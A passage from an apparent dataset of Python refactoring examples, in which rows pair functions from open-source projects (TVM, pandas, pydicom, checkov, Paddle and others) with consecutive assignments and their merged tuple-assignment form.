        assert len(mod.functions.items()) == 1
        primfunc = mod.functions.items()[0][1]

        extern_calls = list()

        def populate_extern_calls(stmt):
            if isinstance(stmt, tvm.tir.Call) and stmt.op.name == ""tir.call_extern"":
                extern_calls.append(stmt)

        stmt_functor.post_order_visit(primfunc.body, populate_extern_calls)
        return extern_calls

    def collect_tir_buffer_info(npu_ops):
        """"""This is run prior to address assigning to collect tir buffer information
        for verification later on""""""
        _npu_op_tir_buffers = dict()
        for npu_op in npu_ops:
            if isinstance(npu_op, vapi.NpuDmaOperation):
                _npu_op_tir_buffers[npu_op] = (npu_op.src.address, npu_op.dest.address)
            elif issubclass(type(npu_op), vapi.NpuBlockOperation):
                _npu_op_tir_buffers[npu_op] = (
                    npu_op.ifm.tiles.addresses[0],
                    npu_op.ofm.tiles.addresses[0],
                    npu_op.weights,
                    npu_op.biases,
                )
        return _npu_op_tir_buffers

    def _check_buffer(address, region, length, buffer_var):
        """"""Checks whether the buffer information is valid with
        original tir buffers.
        - If its constant, this will check
          the slice in the constant tensor has the values.
        - If its scratch, this will check
          the slice is within scratch and does not have conflicts
          with other scratch tensors.
        - If its input/output, this will check the
          address is zero
        """"""
        inverse_region_map = {
            0: tir_to_cs_translator.BufferType.constant,
            1: tir_to_cs_translator.BufferType.scratch,
            3: tir_to_cs_translator.BufferType.input,
            4: tir_to_cs_translator.BufferType.output,
        }
        buffer_type = inverse_region_map[region]
        buffer_dtype = buffer_var.type_annotation.element_type.dtype
        dtype_bytes = np.iinfo(np.dtype(buffer_dtype)).bits // 8
        if buffer_type == tir_to_cs_translator.BufferType.constant:
            ref = buffer_info[buffer_var].values
            hex_from = address * dtype_bytes * 2
            hex_to = hex_from + length * dtype_bytes * 2
            constant_hex = constant_hex_string[hex_from:hex_to]
            constant_tensor = np.frombuffer(bytearray.fromhex(constant_hex), dtype=buffer_dtype)
            np.array_equal(constant_tensor, ref)
            # Every buffer is adjusted to align to 16 bytes
            length = util.round_up(length, 16)
            # Mark these constants are read at least once
            constant_tensor_read_mask[address : address + length] = np.ones(
                length, dtype=buffer_dtype
            )
        elif buffer_type == tir_to_cs_translator.BufferType.scratch:
            assert address < tvmbaw_workspace_size

            size_in_bytes = allocate_node_sizes[buffer_var]
            # Every buffer is adjusted to align to 16 bytes
            size_in_bytes = util.round_up(size_in_bytes, 16)
            assert address + size_in_bytes <= tvmbaw_workspace_size
            # The scratch area should not be used by any other buffer
            assert not tvmbaw_workspace_mask[address : address + size_in_bytes].any()
            # The scratch area is marked as used
            tvmbaw_workspace_mask[address : address + size_in_bytes] = np.ones(
                size_in_bytes, dtype=""uint8""
            )
        elif buffer_type == tir_to_cs_translator.BufferType.input:
            assert address == 0
        else:
            assert buffer_type == tir_to_cs_translator.BufferType.output
            assert address == 0

    def _get_allocate_node_sizes(mod):
        # There should only be a single function
        assert len(mod.functions.items()) == 1
        primfunc = mod.functions.items()[0][1]
        _allocate_node_sizes = dict()

        def analyze_remaining_allocates(stmt):
            if isinstance(stmt, tvm.tir.stmt.Allocate):
                allocate = stmt
                pointer_type = allocate.buffer_var.type_annotation
                storage_scope = pointer_type.storage_scope
                if storage_scope == ""global"":
                    dtype_bytes = np.iinfo(np.dtype(allocate.dtype)).bits // 8
                    size_in_bytes = int(dtype_bytes * np.prod(list(allocate.extents)))
                    # Every memory address the NPU access have to be 16 byte aligned
                    size_in_bytes = util.round_up(size_in_bytes, 16)
                    _allocate_node_sizes[allocate.buffer_var] = size_in_bytes

        tvm.tir.stmt_functor.post_order_visit(primfunc.body, analyze_remaining_allocates)
        return _allocate_node_sizes

    def verify(npu_ops):
        """"""This wrapper verifies the allocated addresses matches with original tir buffers""""""
        checked_buffers = set()

        def check_buffer(address, region, length, buffer_var):
            if buffer_var not in checked_buffers:
                _check_buffer(address, region, length, buffer_var)
                checked_buffers.add(buffer_var)

        for npu_op in npu_ops:
            if isinstance(npu_op, vapi.NpuDmaOperation):
                src_tir_buffer_var = npu_op_tir_buffers[npu_op][0].buffer.data
                check_buffer(
                    npu_op.src.address, npu_op.src.region, npu_op.src.length, src_tir_buffer_var
                )
                dest_tir_load = npu_op_tir_buffers[npu_op][1].buffer.data
                check_buffer(
                    npu_op.dest.address,
                    npu_op.dest.region,
                    npu_op.dest.length,
                    dest_tir_load,
                )
            elif issubclass(type(npu_op), vapi.NpuBlockOperation):
                ifm_tir_buffer_var = npu_op_tir_buffers[npu_op][0].buffer.data
                ifm_length = (
                    npu_op.ifm.shape.height * npu_op.ifm.shape.width * npu_op.ifm.shape.depth
                )
                check_buffer(
                    npu_op.ifm.tiles.addresses[0],
                    npu_op.ifm.region,
                    ifm_length,
                    ifm_tir_buffer_var,
                )
                ofm_tir_buffer_var = npu_op_tir_buffers[npu_op][1].buffer.data
                ofm_length = (
                    npu_op.ofm.shape.height * npu_op.ofm.shape.width * npu_op.ofm.shape.depth
                )
                check_buffer(
                    npu_op.ofm.tiles.addresses[0],
                    npu_op.ofm.region,
                    ofm_length,
                    ofm_tir_buffer_var,
                )
                for idx, weight in enumerate(npu_op_tir_buffers[npu_op][2]):
                    assert isinstance(weight, vapi.NpuAddressRange)
                    check_buffer(
                        npu_op.weights[idx].address,
                        npu_op.weights[idx].region,
                        npu_op.weights[idx].length,
                        weight.address.buffer.data,
                    )
                for idx, bias in enumerate(npu_op_tir_buffers[npu_op][3]):
                    assert isinstance(bias, vapi.NpuAddressRange)
                    check_buffer(
                        npu_op.biases[idx].address,
                        npu_op.biases[idx].region,
                        npu_op.biases[idx].length,
                        bias.address.buffer.data,
                    )

    for test_case in test_cases:
        tir_mod = test_case[""tir_module""]
        tir_mod[""main""] = tir_mod[""main""].with_attr(""target"", tvm.target.Target(""ethos-u""))
        tir_mod = tvm.tir.transform.MakeUnpackedAPI()(tir_mod)
        candidate_regions_for_scratch = [5, 2, 1]
        (
            scratch_region_map,
            tvmbaw_workspace_size,
            _,
        ) = tir_to_cs_translator.analyze_scratch_memory_acesses(
            tir_mod, candidate_regions_for_scratch
        )
        allocate_node_sizes = _get_allocate_node_sizes(tir_mod)
        buffer_info = tir_to_cs_translator.extract_buffer_info(tir_mod, test_case[""param_dict""])
        extern_calls = extract_call_extern_list(tir_mod)
        _npu_ops = list()
        for extern_call in extern_calls:
            _npu_ops.append(tir_to_cs_translator.translate_ethosu_tir_call_extern(extern_call))
        npu_op_tir_buffers = collect_tir_buffer_info(_npu_ops)
        (_npu_ops, constant_hex_string) = tir_to_cs_translator.assign_addresses(
            buffer_info, _npu_ops, scratch_region_map
        )
        tvmbaw_workspace_mask = np.zeros(tvmbaw_workspace_size, dtype=""uint8"")
        constant_tensor_read_mask = np.zeros(len(constant_hex_string) // 2, dtype=""uint8"")
        verify(_npu_ops)
        # This will be only 1 if all allocated scratch is used.
        assert np.prod(tvmbaw_workspace_mask) == 1
        # This will be only 1 if all constant tensors is read at least once.
        assert np.prod(constant_tensor_read_mask) == 1","ifm_tir_buffer_var = npu_op_tir_buffers[npu_op][0].buffer.data
ifm_length = npu_op.ifm.shape.height * npu_op.ifm.shape.width * npu_op.ifm.shape.depth","ifm_tir_buffer_var , ifm_length  = npu_op_tir_buffers[npu_op][0].buffer.data, npu_op.ifm.shape.height * npu_op.ifm.shape.width * npu_op.ifm.shape.depth"
tvm,https://github.com/apache/tvm/tree/master/tests/python/contrib/test_ethosu/test_tir_to_cs_translator.py,,test_assign_addresses$698,"def test_assign_addresses():
    test_cases = [
        {
            # Stimulus
            ""tir_module"": WeightStreamOnly,
            ""param_dict"": {
                WeightStreamOnly[""main""].attrs[""constants""][""buffer""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [128], ""uint8""
                ),
                WeightStreamOnly[""main""].attrs[""constants""][""buffer_1""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [32], ""uint8""
                ),
                WeightStreamOnly[""main""].attrs[""constants""][""buffer_2""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [112], ""uint8""
                ),
                WeightStreamOnly[""main""].attrs[""constants""][""buffer_3""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [32], ""uint8""
                ),
                WeightStreamOnly[""main""].attrs[""constants""][""buffer_4""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [112], ""uint8""
                ),
                WeightStreamOnly[""main""].attrs[""constants""][""buffer_5""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [32], ""uint8""
                ),
                WeightStreamOnly[""main""].attrs[""constants""][""buffer_6""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [112], ""uint8""
                ),
                WeightStreamOnly[""main""].attrs[""constants""][""buffer_7""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [32], ""uint8""
                ),
            },
        },
        {
            # Stimulus
            ""tir_module"": MixedRead,
            ""param_dict"": {
                MixedRead[""main""].attrs[""constants""][""buffer""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [592], ""uint8""
                ),
                MixedRead[""main""].attrs[""constants""][""buffer_1""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [160], ""uint8""
                ),
                MixedRead[""main""].attrs[""constants""][""buffer_2""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [80], ""uint8""
                ),
                MixedRead[""main""].attrs[""constants""][""buffer_3""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [32], ""uint8""
                ),
                MixedRead[""main""].attrs[""constants""][""buffer_4""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [80], ""uint8""
                ),
                MixedRead[""main""].attrs[""constants""][""buffer_5""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [32], ""uint8""
                ),
                MixedRead[""main""].attrs[""constants""][""buffer_6""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [80], ""uint8""
                ),
                MixedRead[""main""].attrs[""constants""][""buffer_7""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [32], ""uint8""
                ),
                MixedRead[""main""].attrs[""constants""][""buffer_8""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [80], ""uint8""
                ),
                MixedRead[""main""].attrs[""constants""][""buffer_9""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [32], ""uint8""
                ),
            },
        },
        {
            # Stimulus
            ""tir_module"": MixedConstantDatatypes,
            ""param_dict"": {
                MixedConstantDatatypes[""main""].attrs[""constants""][""buffer""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [160], ""uint8""
                ),
                MixedConstantDatatypes[""main""].attrs[""constants""][""buffer_2""]: np.random.randint(
                    np.iinfo(""int16"").min, np.iinfo(""int16"").max, [1], ""int16""
                ),
                MixedConstantDatatypes[""main""].attrs[""constants""][""buffer_1""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [272], ""uint8""
                ),
            },
        },
    ]

    def extract_call_extern_list(mod):
        """"""This function will obtain all ethosu_conv2d
        calls from a NPU TIR module
        Parameters
        ----------
        mod : tvm.IRModule
            This is a NPU TIR Module

        Returns
        -------
        list
            of tvm.tir.Call objects
            that are tir extern calls
            for ethosu_conv2d
        """"""
        # There should only be a single function
        assert len(mod.functions.items()) == 1
        primfunc = mod.functions.items()[0][1]

        extern_calls = list()

        def populate_extern_calls(stmt):
            if isinstance(stmt, tvm.tir.Call) and stmt.op.name == ""tir.call_extern"":
                extern_calls.append(stmt)

        stmt_functor.post_order_visit(primfunc.body, populate_extern_calls)
        return extern_calls

    def collect_tir_buffer_info(npu_ops):
        """"""This is run prior to address assigning to collect tir buffer information
        for verification later on""""""
        _npu_op_tir_buffers = dict()
        for npu_op in npu_ops:
            if isinstance(npu_op, vapi.NpuDmaOperation):
                _npu_op_tir_buffers[npu_op] = (npu_op.src.address, npu_op.dest.address)
            elif issubclass(type(npu_op), vapi.NpuBlockOperation):
                _npu_op_tir_buffers[npu_op] = (
                    npu_op.ifm.tiles.addresses[0],
                    npu_op.ofm.tiles.addresses[0],
                    npu_op.weights,
                    npu_op.biases,
                )
        return _npu_op_tir_buffers

    def _check_buffer(address, region, length, buffer_var):
        """"""Checks whether the buffer information is valid with
        original tir buffers.
        - If its constant, this will check
          the slice in the constant tensor has the values.
        - If its scratch, this will check
          the slice is within scratch and does not have conflicts
          with other scratch tensors.
        - If its input/output, this will check the
          address is zero
        """"""
        inverse_region_map = {
            0: tir_to_cs_translator.BufferType.constant,
            1: tir_to_cs_translator.BufferType.scratch,
            3: tir_to_cs_translator.BufferType.input,
            4: tir_to_cs_translator.BufferType.output,
        }
        buffer_type = inverse_region_map[region]
        buffer_dtype = buffer_var.type_annotation.element_type.dtype
        dtype_bytes = np.iinfo(np.dtype(buffer_dtype)).bits // 8
        if buffer_type == tir_to_cs_translator.BufferType.constant:
            ref = buffer_info[buffer_var].values
            hex_from = address * dtype_bytes * 2
            hex_to = hex_from + length * dtype_bytes * 2
            constant_hex = constant_hex_string[hex_from:hex_to]
            constant_tensor = np.frombuffer(bytearray.fromhex(constant_hex), dtype=buffer_dtype)
            np.array_equal(constant_tensor, ref)
            # Every buffer is adjusted to align to 16 bytes
            length = util.round_up(length, 16)
            # Mark these constants are read at least once
            constant_tensor_read_mask[address : address + length] = np.ones(
                length, dtype=buffer_dtype
            )
        elif buffer_type == tir_to_cs_translator.BufferType.scratch:
            assert address < tvmbaw_workspace_size

            size_in_bytes = allocate_node_sizes[buffer_var]
            # Every buffer is adjusted to align to 16 bytes
            size_in_bytes = util.round_up(size_in_bytes, 16)
            assert address + size_in_bytes <= tvmbaw_workspace_size
            # The scratch area should not be used by any other buffer
            assert not tvmbaw_workspace_mask[address : address + size_in_bytes].any()
            # The scratch area is marked as used
            tvmbaw_workspace_mask[address : address + size_in_bytes] = np.ones(
                size_in_bytes, dtype=""uint8""
            )
        elif buffer_type == tir_to_cs_translator.BufferType.input:
            assert address == 0
        else:
            assert buffer_type == tir_to_cs_translator.BufferType.output
            assert address == 0

    def _get_allocate_node_sizes(mod):
        # There should only be a single function
        assert len(mod.functions.items()) == 1
        primfunc = mod.functions.items()[0][1]
        _allocate_node_sizes = dict()

        def analyze_remaining_allocates(stmt):
            if isinstance(stmt, tvm.tir.stmt.Allocate):
                allocate = stmt
                pointer_type = allocate.buffer_var.type_annotation
                storage_scope = pointer_type.storage_scope
                if storage_scope == ""global"":
                    dtype_bytes = np.iinfo(np.dtype(allocate.dtype)).bits // 8
                    size_in_bytes = int(dtype_bytes * np.prod(list(allocate.extents)))
                    # Every memory address the NPU access have to be 16 byte aligned
                    size_in_bytes = util.round_up(size_in_bytes, 16)
                    _allocate_node_sizes[allocate.buffer_var] = size_in_bytes

        tvm.tir.stmt_functor.post_order_visit(primfunc.body, analyze_remaining_allocates)
        return _allocate_node_sizes

    def verify(npu_ops):
        """"""This wrapper verifies the allocated addresses matches with original tir buffers""""""
        checked_buffers = set()

        def check_buffer(address, region, length, buffer_var):
            if buffer_var not in checked_buffers:
                _check_buffer(address, region, length, buffer_var)
                checked_buffers.add(buffer_var)

        for npu_op in npu_ops:
            if isinstance(npu_op, vapi.NpuDmaOperation):
                src_tir_buffer_var = npu_op_tir_buffers[npu_op][0].buffer.data
                check_buffer(
                    npu_op.src.address, npu_op.src.region, npu_op.src.length, src_tir_buffer_var
                )
                dest_tir_load = npu_op_tir_buffers[npu_op][1].buffer.data
                check_buffer(
                    npu_op.dest.address,
                    npu_op.dest.region,
                    npu_op.dest.length,
                    dest_tir_load,
                )
            elif issubclass(type(npu_op), vapi.NpuBlockOperation):
                ifm_tir_buffer_var = npu_op_tir_buffers[npu_op][0].buffer.data
                ifm_length = (
                    npu_op.ifm.shape.height * npu_op.ifm.shape.width * npu_op.ifm.shape.depth
                )
                check_buffer(
                    npu_op.ifm.tiles.addresses[0],
                    npu_op.ifm.region,
                    ifm_length,
                    ifm_tir_buffer_var,
                )
                ofm_tir_buffer_var = npu_op_tir_buffers[npu_op][1].buffer.data
                ofm_length = (
                    npu_op.ofm.shape.height * npu_op.ofm.shape.width * npu_op.ofm.shape.depth
                )
                check_buffer(
                    npu_op.ofm.tiles.addresses[0],
                    npu_op.ofm.region,
                    ofm_length,
                    ofm_tir_buffer_var,
                )
                for idx, weight in enumerate(npu_op_tir_buffers[npu_op][2]):
                    assert isinstance(weight, vapi.NpuAddressRange)
                    check_buffer(
                        npu_op.weights[idx].address,
                        npu_op.weights[idx].region,
                        npu_op.weights[idx].length,
                        weight.address.buffer.data,
                    )
                for idx, bias in enumerate(npu_op_tir_buffers[npu_op][3]):
                    assert isinstance(bias, vapi.NpuAddressRange)
                    check_buffer(
                        npu_op.biases[idx].address,
                        npu_op.biases[idx].region,
                        npu_op.biases[idx].length,
                        bias.address.buffer.data,
                    )

    for test_case in test_cases:
        tir_mod = test_case[""tir_module""]
        tir_mod[""main""] = tir_mod[""main""].with_attr(""target"", tvm.target.Target(""ethos-u""))
        tir_mod = tvm.tir.transform.MakeUnpackedAPI()(tir_mod)
        candidate_regions_for_scratch = [5, 2, 1]
        (
            scratch_region_map,
            tvmbaw_workspace_size,
            _,
        ) = tir_to_cs_translator.analyze_scratch_memory_acesses(
            tir_mod, candidate_regions_for_scratch
        )
        allocate_node_sizes = _get_allocate_node_sizes(tir_mod)
        buffer_info = tir_to_cs_translator.extract_buffer_info(tir_mod, test_case[""param_dict""])
        extern_calls = extract_call_extern_list(tir_mod)
        _npu_ops = list()
        for extern_call in extern_calls:
            _npu_ops.append(tir_to_cs_translator.translate_ethosu_tir_call_extern(extern_call))
        npu_op_tir_buffers = collect_tir_buffer_info(_npu_ops)
        (_npu_ops, constant_hex_string) = tir_to_cs_translator.assign_addresses(
            buffer_info, _npu_ops, scratch_region_map
        )
        tvmbaw_workspace_mask = np.zeros(tvmbaw_workspace_size, dtype=""uint8"")
        constant_tensor_read_mask = np.zeros(len(constant_hex_string) // 2, dtype=""uint8"")
        verify(_npu_ops)
        # This will be only 1 if all allocated scratch is used.
        assert np.prod(tvmbaw_workspace_mask) == 1
        # This will be only 1 if all constant tensors is read at least once.
        assert np.prod(constant_tensor_read_mask) == 1","ofm_tir_buffer_var = npu_op_tir_buffers[npu_op][1].buffer.data
ofm_length = npu_op.ofm.shape.height * npu_op.ofm.shape.width * npu_op.ofm.shape.depth","ofm_tir_buffer_var , ofm_length  = npu_op_tir_buffers[npu_op][1].buffer.data, npu_op.ofm.shape.height * npu_op.ofm.shape.width * npu_op.ofm.shape.depth"
bitcoin-arbitrage,https://github.com/maxme/bitcoin-arbitrage/tree/master/arbitrage/observers/emailer.py,,send_email$7,"def send_email(subject, message):
    _to = config.smtp_to
    _from = config.smtp_from
    mime_message = (
        """"""From: Python Arbitrage Script <%(_from)s>
To: <%(_to)s>
Subject: %(subject)s

%(message)s
""""""
        % locals()
    )
    try:
        smtpObj = smtplib.SMTP(config.smtp_host)
        smtpObj.sendmail(_from, [_to], mime_message)
    except smtplib.SMTPException:
        logging.warn(""Unable to send email"")","_to = config.smtp_to
_from = config.smtp_from
mime_message = 'From: Python Arbitrage Script <%(_from)s>\nTo: <%(_to)s>\nSubject: %(subject)s\n\n%(message)s\n' % locals()","_to , _from , mime_message  = config.smtp_to, config.smtp_from, 'From: Python Arbitrage Script <%(_from)s>\nTo: <%(_to)s>\nSubject: %(subject)s\n\n%(message)s\n' % locals()"
pandas,https://github.com/pandas-dev/pandas/tree/master/pandas/tests/io/parser/usecols/test_usecols_basic.py,,test_usecols_relative_to_names2$90,"def test_usecols_relative_to_names2(all_parsers):
    # see gh-5766
    data = """"""\
1,2,3
4,5,6
7,8,9
10,11,12""""""
    parser = all_parsers
    result = parser.read_csv(
        StringIO(data), names=[""a"", ""b""], header=None, usecols=[0, 1]
    )

    expected = DataFrame([[1, 2], [4, 5], [7, 8], [10, 11]], columns=[""a"", ""b""])
    tm.assert_frame_equal(result, expected)","data = '1,2,3\n4,5,6\n7,8,9\n10,11,12'
parser = all_parsers","data , parser  = '1,2,3\n4,5,6\n7,8,9\n10,11,12', all_parsers"
pandas,https://github.com/pandas-dev/pandas/tree/master/pandas/tests/io/parser/usecols/test_usecols_basic.py,,test_usecols_relative_to_names2$90,"def test_usecols_relative_to_names2(all_parsers):
    # see gh-5766
    data = """"""\
1,2,3
4,5,6
7,8,9
10,11,12""""""
    parser = all_parsers
    result = parser.read_csv(
        StringIO(data), names=[""a"", ""b""], header=None, usecols=[0, 1]
    )

    expected = DataFrame([[1, 2], [4, 5], [7, 8], [10, 11]], columns=[""a"", ""b""])
    tm.assert_frame_equal(result, expected)","result = parser.read_csv(StringIO(data), names=['a', 'b'], header=None, usecols=[0, 1])
expected = DataFrame([[1, 2], [4, 5], [7, 8], [10, 11]], columns=['a', 'b'])","result , expected  = parser.read_csv(StringIO(data), names=['a', 'b'], header=None, usecols=[0, 1]), DataFrame([[1, 2], [4, 5], [7, 8], [10, 11]], columns=['a', 'b'])"
Paddle,https://github.com/PaddlePaddle/Paddle/tree/master/python/paddle/fluid/tests/unittests/test_dataloader_unkeep_order.py,IterableDataLoaderKeepOrderTest5,initParameters$216,"def initParameters(self):
        self.iterable = False
        self.break_num = 0","self.iterable = False
self.break_num = 0","self.iterable , self.break_num  = False, 0"
checkov,https://github.com/bridgecrewio/checkov/tree/master/checkov/cloudformation/checks/resource/aws/CloudWatchLogGroupKMSKey.py,CloudWatchLogGroupKMSKey,__init__$7,"def __init__(self):
        name = ""Ensure that CloudWatch Log Group is encrypted by KMS""
        id = ""CKV_AWS_158""
        supported_resource = ['AWS::Logs::LogGroup']
        categories = [CheckCategories.ENCRYPTION]
        super().__init__(name=name, id=id, categories=categories, supported_resources=supported_resource)","name = 'Ensure that CloudWatch Log Group is encrypted by KMS'
id = 'CKV_AWS_158'
supported_resource = ['AWS::Logs::LogGroup']
categories = [CheckCategories.ENCRYPTION]","name , id , supported_resource , categories  = 'Ensure that CloudWatch Log Group is encrypted by KMS', 'CKV_AWS_158', ['AWS::Logs::LogGroup'], [CheckCategories.ENCRYPTION]"
pydicom,https://github.com/pydicom/pydicom/tree/master/pydicom/tests/test_fileset.py,TestFileSet_Copy,test_copy$2465,"def test_copy(self, dicomdir, tdir):
        """"""Test FileSet.copy()""""""
        orig_root = Path(dicomdir.filename).parent
        fs = FileSet(dicomdir)

        fs.ID = ""NEW ID""
        uid = fs.UID = generate_uid()
        fs.descriptor_file_id = ""README""
        fs.descriptor_character_set = ""ISO_IR 100""
        cp, ds, paths = copy_fs(fs, tdir.name)
        assert 31 == len(paths)
        assert (
            ('PT000000', 'ST000000', 'SE000000', 'IM000000')
        ) == paths[0].parts[-4:]
        assert (
            ('PT000001', 'ST000003', 'SE000002', 'IM000006')
        ) == paths[-1].parts[-4:]

        # Check existing File-set remains the same
        assert ""NEW ID"" == fs.ID
        assert dicomdir.file_meta.TransferSyntaxUID == ExplicitVRLittleEndian
        assert uid == fs.UID
        assert dicomdir.file_meta.MediaStorageSOPInstanceUID == fs.UID
        assert ""README"" == fs.descriptor_file_id
        assert ""ISO_IR 100"" == fs.descriptor_character_set
        assert not bool(fs._stage['+'])
        assert not bool(fs._stage['-'])
        assert fs.is_staged
        paths = list(orig_root.glob('98892001/**/*'))
        paths += list(orig_root.glob('98892003/**/*'))
        paths += list(orig_root.glob('77654033/**/*'))
        paths = [p for p in paths if p.is_file()]

        # Test new File-set
        assert len(fs) == len(cp)
        for ref, instance in zip(fs, cp):
            assert ref.SOPInstanceUID == instance.SOPInstanceUID

        assert ds.file_meta.TransferSyntaxUID == ExplicitVRLittleEndian
        assert not ds.is_implicit_VR
        assert ds.is_little_endian
        assert not cp.is_staged
        assert ""NEW ID"" == cp.ID
        assert uid == cp.UID
        assert ds.file_meta.MediaStorageSOPInstanceUID == cp.UID
        assert ""README"" == cp.descriptor_file_id
        assert ""ISO_IR 100"" == cp.descriptor_character_set","orig_root = Path(dicomdir.filename).parent
fs = FileSet(dicomdir)","orig_root , fs  = Path(dicomdir.filename).parent, FileSet(dicomdir)"
pydicom,https://github.com/pydicom/pydicom/tree/master/pydicom/tests/test_fileset.py,TestFileSet_Copy,test_copy$2465,"def test_copy(self, dicomdir, tdir):
        """"""Test FileSet.copy()""""""
        orig_root = Path(dicomdir.filename).parent
        fs = FileSet(dicomdir)

        fs.ID = ""NEW ID""
        uid = fs.UID = generate_uid()
        fs.descriptor_file_id = ""README""
        fs.descriptor_character_set = ""ISO_IR 100""
        cp, ds, paths = copy_fs(fs, tdir.name)
        assert 31 == len(paths)
        assert (
            ('PT000000', 'ST000000', 'SE000000', 'IM000000')
        ) == paths[0].parts[-4:]
        assert (
            ('PT000001', 'ST000003', 'SE000002', 'IM000006')
        ) == paths[-1].parts[-4:]

        # Check existing File-set remains the same
        assert ""NEW ID"" == fs.ID
        assert dicomdir.file_meta.TransferSyntaxUID == ExplicitVRLittleEndian
        assert uid == fs.UID
        assert dicomdir.file_meta.MediaStorageSOPInstanceUID == fs.UID
        assert ""README"" == fs.descriptor_file_id
        assert ""ISO_IR 100"" == fs.descriptor_character_set
        assert not bool(fs._stage['+'])
        assert not bool(fs._stage['-'])
        assert fs.is_staged
        paths = list(orig_root.glob('98892001/**/*'))
        paths += list(orig_root.glob('98892003/**/*'))
        paths += list(orig_root.glob('77654033/**/*'))
        paths = [p for p in paths if p.is_file()]

        # Test new File-set
        assert len(fs) == len(cp)
        for ref, instance in zip(fs, cp):
            assert ref.SOPInstanceUID == instance.SOPInstanceUID

        assert ds.file_meta.TransferSyntaxUID == ExplicitVRLittleEndian
        assert not ds.is_implicit_VR
        assert ds.is_little_endian
        assert not cp.is_staged
        assert ""NEW ID"" == cp.ID
        assert uid == cp.UID
        assert ds.file_meta.MediaStorageSOPInstanceUID == cp.UID
        assert ""README"" == cp.descriptor_file_id
        assert ""ISO_IR 100"" == cp.descriptor_character_set","fs.descriptor_file_id = 'README'
fs.descriptor_character_set = 'ISO_IR 100'","fs.descriptor_file_id , fs.descriptor_character_set  = 'README', 'ISO_IR 100'"
Chainer_Realtime_Multi-Person_Pose_Estimation,https://github.com/DeNA/Chainer_Realtime_Multi-Person_Pose_Estimation/tree/master//pose_detector.py,PoseDetector,crop_person$311,"def crop_person(self, img, person_pose, unit_length):
        top_joint_priority = [4, 5, 6, 12, 16, 7, 13, 17, 8, 10, 14, 9, 11, 15, 2, 3, 0, 1, sys.maxsize]
        bottom_joint_priority = [9, 6, 7, 14, 16, 8, 15, 17, 4, 2, 0, 5, 3, 1, 10, 11, 12, 13, sys.maxsize]

        top_joint_index = len(top_joint_priority) - 1
        bottom_joint_index = len(bottom_joint_priority) - 1
        left_joint_index = 0
        right_joint_index = 0
        top_pos = sys.maxsize
        bottom_pos = 0
        left_pos = sys.maxsize
        right_pos = 0

        for i, joint in enumerate(person_pose):
            if joint[2] > 0:
                if top_joint_priority[i] < top_joint_priority[top_joint_index]:
                    top_joint_index = i
                elif bottom_joint_priority[i] < bottom_joint_priority[bottom_joint_index]:
                    bottom_joint_index = i
                if joint[1] < top_pos:
                    top_pos = joint[1]
                elif joint[1] > bottom_pos:
                    bottom_pos = joint[1]

                if joint[0] < left_pos:
                    left_pos = joint[0]
                    left_joint_index = i
                elif joint[0] > right_pos:
                    right_pos = joint[0]
                    right_joint_index = i

        top_padding_radio = [0.9, 1.9, 1.9, 2.9, 3.7, 1.9, 2.9, 3.7, 4.0, 5.5, 7.0, 4.0, 5.5, 7.0, 0.7, 0.8, 0.7, 0.8]
        bottom_padding_radio = [6.9, 5.9, 5.9, 4.9, 4.1, 5.9, 4.9, 4.1, 3.8, 2.3, 0.8, 3.8, 2.3, 0.8, 7.1, 7.0, 7.1, 7.0]

        left = (left_pos - 0.3 * unit_length).astype(int)
        right = (right_pos + 0.3 * unit_length).astype(int)
        top = (top_pos - top_padding_radio[top_joint_index] * unit_length).astype(int)
        bottom = (bottom_pos + bottom_padding_radio[bottom_joint_index] * unit_length).astype(int)
        bbox = (left, top, right, bottom)

        cropped_img = self.crop_image(img, bbox)
        return cropped_img, bbox","top_joint_index = len(top_joint_priority) - 1
bottom_joint_index = len(bottom_joint_priority) - 1
left_joint_index = 0
right_joint_index = 0
top_pos = sys.maxsize
bottom_pos = 0
left_pos = sys.maxsize
right_pos = 0","top_joint_index , bottom_joint_index , left_joint_index , right_joint_index , top_pos , bottom_pos , left_pos , right_pos  = len(top_joint_priority) - 1, len(bottom_joint_priority) - 1, 0, 0, sys.maxsize, 0, sys.maxsize, 0"
Chainer_Realtime_Multi-Person_Pose_Estimation,https://github.com/DeNA/Chainer_Realtime_Multi-Person_Pose_Estimation/tree/master//pose_detector.py,PoseDetector,crop_person$311,"def crop_person(self, img, person_pose, unit_length):
        top_joint_priority = [4, 5, 6, 12, 16, 7, 13, 17, 8, 10, 14, 9, 11, 15, 2, 3, 0, 1, sys.maxsize]
        bottom_joint_priority = [9, 6, 7, 14, 16, 8, 15, 17, 4, 2, 0, 5, 3, 1, 10, 11, 12, 13, sys.maxsize]

        top_joint_index = len(top_joint_priority) - 1
        bottom_joint_index = len(bottom_joint_priority) - 1
        left_joint_index = 0
        right_joint_index = 0
        top_pos = sys.maxsize
        bottom_pos = 0
        left_pos = sys.maxsize
        right_pos = 0

        for i, joint in enumerate(person_pose):
            if joint[2] > 0:
                if top_joint_priority[i] < top_joint_priority[top_joint_index]:
                    top_joint_index = i
                elif bottom_joint_priority[i] < bottom_joint_priority[bottom_joint_index]:
